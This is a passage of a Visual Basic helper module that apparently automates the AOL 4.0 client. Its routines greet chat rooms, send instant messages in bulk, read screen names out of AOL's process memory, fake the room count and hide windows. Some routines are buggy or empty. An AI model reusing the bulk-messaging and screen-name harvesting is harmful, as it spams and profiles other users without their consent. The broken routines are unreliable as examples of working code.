Call AOL40_SendChat("sup " + Person$ + "!")
timeout (0.8)
Next index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function
Public Sub ScrollList(Lst As ListBox)
For X% = 0 To Lst.ListCount - 1
ChatSend Lst.List(X%)
timeout (0.75)
Next X%
End Sub
Public Sub ScrollCombo(cmb As ComboBox)
For X% = 0 To cmb.ListCount - 1
ChatSend cmb.List(X%)
timeout (0.75)
Next X%
End Sub
Function AOLSeeYaRoom()
AOL40_IsOnline
If AOL40_IsOnline = 0 Then GoTo last
AOL40_FindChatRoom
If AOL40_FindChatRoom = 0 Then GoTo last
On Error Resume Next
Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    Room = AOL40_FindChatRoom()
AOLHandle = FindChildByClass(Room, "_AOL_Listbox")
AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)
If AOLProcessThread Then
For index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Person$ = LCase(Person$)
Call AOL40_SendChat("see ya " + Person$ + "!")
timeout (0.8)
Next index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function
Sub ChatChangeCaption(newcap)
Room% = AOL40_FindChatRoom()
Call WindowChangeCaption(Room%, newcap)
End Sub
Sub WindowChangeCaption(win, Txt)
Text% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Public Sub BuddyListHide()
X = FindChildByTitle(AOLMDI(), "Buddy List Window")
Call ShowWindow(X, SW_HIDE)
End Sub
Public Sub BuddyListShow()
PoPup 9, "V"
End Sub
Public Sub BuddiesToListBox(thelist As ListBox, AddUser As Boolean)
    On Error Resume Next
    Dim cProcess As Long, itmHold As Long, ScreenName As String
    Dim psnHold As Long, rBytes As Long, index As Long, Room As Long
    Dim rList As Long, sThread As Long, mThread As Long
    Room& = FindChildByTitle(AOLMDI(), "Buddy List Window")
    If Room& = 0& Then
    PoPup 9, "V"
    End If
    Do: DoEvents
    Room& = FindChildByTitle(AOLMDI(), "Buddy List Window")
    Loop Until Room& <> 0
    Pause 1
    rList& = FindWindowEx(Room&, 0&, "_AOL_Listbox", vbNullString)
    sThread& = GetWindowThreadProcessId(rList, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index& = 0 To SendMessage(rList, LB_GETCOUNT, 0, 0) - 1
            ScreenName$ = String$(4, vbNullChar)
            itmHold& = SendMessage(rList, LB_GETITEMDATA, ByVal CLng(index&), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName$, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName$, 4)
            psnHold& = psnHold& + 6
            ScreenName$ = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName$, Len(ScreenName$), rBytes&)
            ScreenName$ = Left$(ScreenName$, InStr(ScreenName$, vbNullChar) - 1)
            If Len(ScreenName$) > 14 Then
            Else
            If ScreenName$ <> GetUser$ Or AddUser = True Then
            thelist.AddItem Mid(ScreenName$, 5)
            End If
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub
Sub RespondIM(message)
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If im% Then GoTo Greed
Exit Sub
Greed:
e = FindChildByClass(im%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e2 = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e2, GW_HWNDNEXT)
Call AOLSetText(e2, message)
AOLClickIcon (e)
timeout (0.8)
e = FindChildByClass(im%, "RICHCNTL")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
AOLClickIcon (e)
End Sub
Sub AOLClickIcon(icon%)
CLck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
CLck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub KillIMWinTo()
hehehe = 0
ReFind:
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
res% = FindChildByTitle(MDI%, "Untitled")
If res% Then GoTo Greed
res% = FindChildByTitle(MDI%, ">Instant Message To:")
If res% Then GoTo Greed
res% = FindChildByTitle(MDI%, "  Instant Message To:")
If res% Then GoTo Greed
hehehe = hehehe + 1
If hehehe = 200 Then Exit Sub
GoTo ReFind
Greed:
KillWin (res%)
End Sub
Sub KillIMWinFrom()
hehehe = 0
ReFind:
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
res% = FindChildByTitle(MDI%, "Untitled")
If res% Then GoTo Greed
res% = FindChildByTitle(MDI%, ">Instant Message From:")
If res% Then GoTo Greed
res% = FindChildByTitle(MDI%, "  Instant Message From:")
If res% Then GoTo Greed
hehehe = hehehe + 1
If hehehe = 200 Then Exit Sub
GoTo ReFind
Greed:
KillWin (res%)
End Sub
Sub KillIInvite()
hehehe = 0
ReFind:
DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
res% = FindChildByTitle(MDI%, "Untitled")
If res% Then GoTo Greed
res% = FindChildByTitle(MDI%, "Invitation From:")
If res% Then GoTo Greed
res% = FindChildByTitle(MDI%, "  Invitation From:")
If res% Then GoTo Greed
hehehe = hehehe + 1
If hehehe = 200 Then Exit Sub
GoTo ReFind
Greed:
KillWin (res%)
End Sub
Public Sub MailOpenFlash()
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RIGHT, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RIGHT, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub
Public Sub MailOpenOld()
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 4
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub
Public Function CheckIMs(Person As String) As Boolean
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim Available As Long, Available1 As Long, Available2 As Long
    Dim Available3 As Long, oWindow As Long, oButton As Long
    Dim oStatic As Long, oString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call KeyWord("aol://9293:" & Person$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        Available1& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        Available2& = FindWindowEx(im&, Available1&, "_AOL_Icon", vbNullString)
        Available3& = FindWindowEx(im&, Available2&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available3&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
        Available& = FindWindowEx(im&, Available&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich <> 0& And Available& <> 0& And Available& <> Available1& And Available& <> Available2& And Available& <> Available3&
    DoEvents
    Call SendMessage(Available&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Available&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        oWindow& = FindWindow("#32770", "America Online")
        oButton& = FindWindowEx(oWindow&, 0&, "Button", "OK")
    Loop Until oWindow& <> 0& And oButton& <> 0&
    Do
        DoEvents
        oStatic& = FindWindowEx(oWindow&, 0&, "Static", vbNullString)
        oStatic& = FindWindowEx(oWindow&, oStatic&, "Static", vbNullString)
        oString$ = GetText(oStatic)
    Loop Until oStatic& <> 0& And Len(oString$) > 15
    If InStr(oString$, "is online and able to receive") <> 0 Then
        CheckIMs = True
        Else
        CheckIMs = False
       End If
       Call SendMessage(oButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(oButton&, WM_KEYUP, VK_SPACE, 0&)
    Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End Function
Public Sub SetText2(Window As Long, Text As String)
    Call SendMessageByString(Window&, WM_SETTEXT, 0&, Text$)
End Sub
Sub AOL4_SetText(win, Txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub
Sub SetText(Window, Text)
ext% = SendMessageByString(Window, WM_SETTEXT, 0, "")
ext% = SendMessageByString(Window, WM_SETTEXT, 0, Text)
End Sub
Sub SetFakeRoomCount()
Room% = ChatFindRoom()
aR1% = FindChildByClass(Room%, "_AOL_Static")
SetText aR1%, "??"
End Sub
Function ChatSendBox()
Room% = ChatFindRoom()
aR1% = FindChildByClass(Room%, "RICHCNTL")
aR2% = GetWindow(aR1%, 2)
aR3% = GetWindow(aR2%, 2)
aR4% = GetWindow(aR3%, 2)
aR5% = GetWindow(aR4%, 2)
aR6% = GetWindow(aR5%, 2)
ar7% = GetWindow(aR6%, 2)
ChatSendBox = ar7%
End Function
Function ChatFindRoom()
    AOL% = FindWindow("AOL Frame25", vbNullString)
    MDI% = FindChildByClass(AOL%, "MDIClient")
    Firs% = GetWindow(MDI%, 5)
    listers% = FindChildByClass(Firs%, "RICHCNTL")
    listere% = FindChildByClass(Firs%, "RICHCNTL")
    listerb% = FindChildByClass(Firs%, "_AOL_Listbox")
    Do While (listers% = 0 Or listere% = 0 Or listerb% = 0) And (l <> 100)
            FreeProcess
            Firs% = GetWindow(Firs%, 2)
            listers% = FindChildByClass(Firs%, "RICHCNTL")
            listere% = FindChildByClass(Firs%, "RICHCNTL")
            listerb% = FindChildByClass(Firs%, "_AOL_Listbox")
            If listers% And listere% And listerb% Then Exit Do
            l = l + 1
    Loop
    If (l < 100) Then
        ChatFindRoom = Firs%
        Exit Function
    End If
    ChatFindRoom = 0
End Function
Function MSGTOP(what$, typer As VbMsgBoxStyle, Title$) As VbMsgBoxResult
X = MsgBox(what$, typer + vbSystemModal, Title$)
MSGTOP = X
End Function
Function RGB2HEX(RedGreenBlue) As String
HexVal$ = Hex(RedGreenBlue)
ZeroFact% = Len(HexVal$)
HexVal$ = String(6 - ZeroFact%, "0") + HexVal$
RGB2HEX = HexVal$
End Function
Function RGBtoFont(Rval, Gval, Bval)
olor = RGB(Rval, Gval, Bval)
roloc = Hex(olor)
html = "<font color=#" & roloc & ">"
RGBtoFont = html
End Function
Function RGBtoBG(Rval, Gval, Bval)
olor = RGB(Rval, Gval, Bval)
roloc = Hex(olor)
html = "<body bgcolor=#" & roloc & ">"
RGBtoBG = html
End Function
Function RandomColor()
Randomize
X = (Rnd * 256) + 1
Y = (Rnd * 256) + 1
z = (Rnd * 256) + 1
RandomColor = RGB(X, Y, z)
End Function
Sub signoff()
Call RunMenuByString3("&Sign Off")
End Sub
Sub Invite(Person)
FreeProcess
On Error GoTo ErrHandler
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
bud% = FindChildByTitle(MDI%, "Buddy List Window")
e = FindChildByClass(bud%, "_AOL_Icon")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
AOLClickIcon (e)
timeout (1#)
chat% = FindChildByTitle(MDI%, "Buddy Chat")
aoledit% = FindChildByClass(chat%, "_AOL_Edit")
If chat% Then GoTo FILL
FILL:
Call AOL4_SetText(aoledit%, Person)
de = FindChildByClass(chat%, "_AOL_Icon")
AOLClickIcon (de)
Killit% = FindChildByTitle(MDI%, "Invitation From:")
KillWin (Killit%)
FreeProcess
ErrHandler:
Exit Sub
End Sub
Sub ClearHistory()
AOL% = FindWindow("aol frame25", vbNullString)
tol% = FindChildByClass(AOL%, "AOL Toolbar")
tod% = FindChildByClass(tol%, "_AOL_Toolbar")
cmb% = FindChildByClass(tod%, "_AOL_Combobox")
SendMessage cmb%, CB_RESETCONTENT, 0, 0
KWbox% = FindChildByClass(cmb%, "Edit")
Call SendMessageByString(KWbox%, WM_SETTEXT, 0, "Type Keyword or Web Address here and click Go")
End Sub
Sub AoL4_Keyword(Txt)
    AOL% = FindWindow("AOL Frame25", vbNullString)
    temp% = FindChildByClass(AOL%, "AOL Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Toolbar")
    temp% = FindChildByClass(temp%, "_AOL_Combobox")
    KWbox% = FindChildByClass(temp%, "Edit")
    Call SendMessageByString(KWbox%, WM_SETTEXT, 0, Txt)
    Call SendMessageByNum(KWbox%, WM_CHAR, VK_SPACE, 0)
    Call SendMessageByNum(KWbox%, WM_CHAR, VK_RETURN, 0)
End Sub
Sub Waitforok2()
Do
DoEvents
OKW = FindWindow("AOL child", "America Online")
If proG_STAT$ = "ON" Then
End If
Exit Sub
Exit Do
Loop Until OKW <> 1
       OKB = FindChildByTitle(OKW, "Cancel")
    okd = SendMessageByNum(OKB, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(OKB, WM_LBUTTONUP, 0, 0&)
End Sub
Function ChatAttending() As Boolean

End Function
Public Sub massimer(Lst As ListBox, Txt As String, blah As Boolean)
List.Enabled = False
I = List.ListCount - 1
List.ListIndex = 0
For X = 0 To I
List.ListIndex = X
Call InstantMessage(List.Text, Txt)
If blah = True Then
KillIMWinTo
Else: End If
timeout 0.7
Next X
List.Enabled = True
End Sub
Sub ScreenSaver()
     Dim lResult As Long
    Const WM_SYSCOMMAND = &H112
    Const SC_SCREENSAVE = &HF140
     lResult = SendMessage(-1, WM_SYSCOMMAND, SC_SCREENSAVE, 0&)
End Sub
Sub Suspender()
 A$ = SetSystemPowerState(Suspend, force)
End Sub
Sub ParentChange(Parent%, location%)
doparent% = SetParent(Parent%, location%)
End Sub
Function StringToInteger(tochange As String) As Integer
StringToInteger = tochange
End Function
Function Spaced(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + " "
Let newsent$ = newsent$ + NextChr$
Loop
Spaced = newsent$
End Function
Function Dots(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let NextChr$ = NextChr$ + "."
Let newsent$ = newsent$ + NextChr$
Loop
Dots = newsent$
End Function
Function Backwards(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
Let newsent$ = NextChr$ & newsent$
Loop
Backwards = newsent$
End Function
Function SkippedBold(strin As String)
For X = 1 To Len(strin) Step 2
I$ = Mid(strin, X, 1)
i2$ = Mid(strin, X + 1, 1)
Final$ = Final$ & "<B>" & I$ & "</B>" & i2$
Next X
SkippedBold = Final$
End Function
Function SkippedItalicBold(strin As String)
For X = 1 To Len(strin) Step 3
I$ = Mid(strin, X, 1)
i2$ = Mid(strin, X + 1, 1)
i3$ = Mid(strin, X + 2, 1)
Final$ = Final$ & "<B>" & I$ & "</B>" & i2$ & "<i>" & i3$ & "</i>"
Next X
SkippedItalicBold = Final$
End Function
Function SkippedStrike(strin As String)
For X = 1 To Len(strin) Step 2
I$ = Mid(strin, X, 1)
i2$ = Mid(strin, X + 1, 1)
Final$ = Final$ & "<S>" & I$ & "</S>" & i2$
Next X
SkippedStrike = Final$
End Function
Function Hacker2(Wat As String)
For X = 1 To Len(Wat) Step 2
I$ = Mid(Wat, X, 1)
i2$ = Mid(Wat, X + 1, 1)
I$ = UCase(I$): i2$ = LCase(i2$)
hack$ = hack$ & I$ & i2$
Next X
Hacker2 = hack$
End Function
Function SkippedBoldWavy(Wat As String)
For X = 1 To Len(Wat) Step 4
 I$ = Mid(Wat, X, 1)
 i2$ = Mid(Wat, X + 1, 1)
 i3$ = Mid(Wat, X + 2, 1)
 i4$ = Mid(Wat, X + 3, 1)
 strin$ = strin$ & "<b><sup>" & I$ & "</sup></b>" & i2$ & "<sub>" & i3$ & "</sub>" & i4$ & "</b>"
 Next X
SkippedBoldWavy = strin$
End Function
Function SkippedItalicBoldWavy(Wat As String)
For X = 1 To Len(Wat) Step 4
 I$ = Mid(Wat, X, 1)
 i2$ = Mid(Wat, X + 1, 1)
 i3$ = Mid(Wat, X + 2, 1)
 i4$ = Mid(Wat, X + 3, 1)
 strin$ = strin$ & "<i><b><sup>" & I$ & "</sup></b>" & i2$ & "<sub>" & i3$ & "</sub>" & i4$ & "</b></i>"
 Next X
SkippedItalicBoldWavy = strin$
End Function
Function HaCkEr(strin As String)
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While NumSpc% <= lenth%
Let NumSpc% = NumSpc% + 1
Let NextChr$ = Mid$(inptxt$, NumSpc%, 1)
If NextChr$ = "A" Then Let NextChr$ = "a"
If NextChr$ = "E" Then Let NextChr$ = "e"
If NextChr$ = "I" Then Let NextChr$ = "i"
If NextChr$ = "O" Then Let NextChr$ = "o"
If NextChr$ = "U" Then Let NextChr$ = "u"
If NextChr$ = "b" Then Let NextChr$ = "B"
If NextChr$ = "c" Then Let NextChr$ = "C"
If NextChr$ = "d" Then Let NextChr$ = "D"
If NextChr$ = "z" Then Let NextChr$ = "Z"
If NextChr$ = "f" Then Let NextChr$ = "F"
If NextChr$ = "g" Then Let NextChr$ = "G"
If NextChr$ = "h" Then Let NextChr$ = "H"
If NextChr$ = "y" Then Let NextChr$ = "Y"
If NextChr$ = "j" Then Let NextChr$ = "J"
If NextChr$ = "k" Then Let NextChr$ = "K"
If NextChr$ = "l" Then Let NextChr$ = "L"
If NextChr$ = "m" Then Let NextChr$ = "M"
If NextChr$ = "n" Then Let NextChr$ = "N"
If NextChr$ = "x" Then Let NextChr$ = "X"
If NextChr$ = "p" Then Let NextChr$ = "P"
If NextChr$ = "q" Then Let NextChr$ = "Q"
If NextChr$ = "r" Then Let NextChr$ = "R"
If NextChr$ = "s" Then Let NextChr$ = "S"
If NextChr$ = "t" Then Let NextChr$ = "T"
If NextChr$ = "w" Then Let NextChr$ = "W"
If NextChr$ = "v" Then Let NextChr$ = "V"
If NextChr$ = " " Then Let NextChr$ = " "
Let newsent$ = newsent$ + NextChr$
Loop
HaCkEr = newsent$
End Function
Function ScreenNameFromIM()
Dim naw$
Dim heh$
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
heh = GetCaption(im%)
naw = Mid(heh$, InStr(heh, ":") + 2)
ScreenNameFromIM = naw
End Function
Function MessageFromIM()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
im% = FindChildByTitle(MDI%, ">Instant Message From:")
If im% Then GoTo Greed
im% = FindChildByTitle(MDI%, "  Instant Message From:")
If im% Then GoTo Greed
Exit Function
Greed:
Dim IMText%
IMText% = FindChildByClass(im%, "RICHCNTL")
IMmessage = GetText(IMText%)
SN = ScreenNameFromIM()
snlen = Len(ScreenNameFromIM()) + 3
blah = Mid(IMmessage, InStr(IMmessagge, SN) + snlen)
MessageFromIM = Left(blah, Len(blah) - 2)
End Function
Public Function FindForwardWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim Rich1 As Long, Rich2 As Long, Combo As Long
    Dim FontCombo As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich1& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
    Rich2& = FindWindowEx(child&, Rich1&, "RICHCNTL", vbNullString)
    Combo& = FindWindowEx(child&, 0&, "_AOL_Combobox", vbNullString)
    FontCombo& = FindWindowEx(child&, 0&, "_AOL_FontCombo", vbNullString)
    If Rich1& <> 0& And Rich2& = 0& And Combo& = 0& And FontCombo& = 0& Then
        FindForwardWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Rich1& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
            Rich2& = FindWindowEx(child&, Rich1&, "RICHCNTL", vbNullString)
            Combo& = FindWindowEx(child&, 0&, "_AOL_Combobox", vbNullString)
            FontCombo& = FindWindowEx(child&, 0&, "_AOL_FontCombo", vbNullString)
            If Rich1& <> 0& And Rich2& = 0& And Combo& = 0& And FontCombo& = 0& Then
                FindForwardWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindForwardWindow& = 0&
End Function
Public Function FindSendWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim SendStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    SendStatic& = FindWindowEx(child&, 0&, "_AOL_Static", "Send Now")
    If SendStatic& <> 0& Then
        FindSendWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            SendStatic& = FindWindowEx(child&, 0&, "_AOL_Static", "Send Now")
            If SendStatic& <> 0& Then
                FindSendWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindSendWindow& = 0&
End Function
Public Sub MailOpenNew()
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, sMod As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub
Public Sub MailOpenSent()
    Dim AOL As Long, tool As Long, toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim CurPos As POINTAPI, WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    toolbar& = FindWindowEx(tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    For DoThis& = 1 To 5
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
End Sub
Public Sub MailOpenEmailFlash(index As Long)
    Dim AOL As Long, MDI As Long, fMail As Long, fList As Long
    Dim fCount As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    fCount& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    If fCount& < index& Then Exit Sub
    Call SendMessage(fList&, LB_SETCURSEL, index&, 0&)
    Call PostMessage(fList&, WM_KEYDOWN, VK_RETURN, 0&)
